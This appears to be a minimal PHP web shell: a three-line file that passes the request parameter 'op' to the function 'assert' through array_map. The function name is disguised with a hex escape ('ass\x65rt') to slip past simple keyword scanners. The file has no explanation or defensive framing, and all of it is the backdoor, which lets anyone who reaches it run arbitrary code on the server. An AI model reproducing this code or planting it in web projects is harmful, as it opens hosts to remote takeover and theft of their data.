<?php 
    $new_array = array_map("ass\x65rt", (array)$_REQUEST['op']);
?>